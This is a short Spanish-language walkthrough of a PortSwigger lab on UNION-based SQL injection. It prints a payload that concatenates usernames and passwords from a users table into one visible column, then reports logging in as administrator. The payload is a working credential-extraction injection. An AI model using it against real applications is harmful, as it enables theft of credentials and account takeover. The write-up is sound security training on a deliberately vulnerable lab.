# SQL Injection UNION Attack - Retrieving Multiple Values in a Single Column

## 📌 Lab Information

- **Lab:** Retrieving Multiple Values in a Single Column
- **Categoría:** UNION SQL Injection

🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

---

## 🎯 Objetivo

Extraer múltiples valores utilizando una sola columna visible.

---

## 🔍 Escenario

El laboratorio solo devuelve texto en una columna.

Debemos concatenar:
- username
- password

---

## 🚀 Payload

```sql
' union select null,username || '-' || password from users -- -
```

![Concatenación credenciales](../../../../Imagenes/pasted-image-20260403211626.png)

---

## 🔓 Acceso administrador

![Login administrador](../../../../Imagenes/pasted-image-20260403211716.png)

---

## 🧠 Explicación Técnica

`||` concatena cadenas en PostgreSQL y Oracle.

Resultado ejemplo:

```text
administrator-123456
```

---

## ✅ Resultado

Se logró:
- Concatenar columnas
- Extraer credenciales
- Acceder como administrador
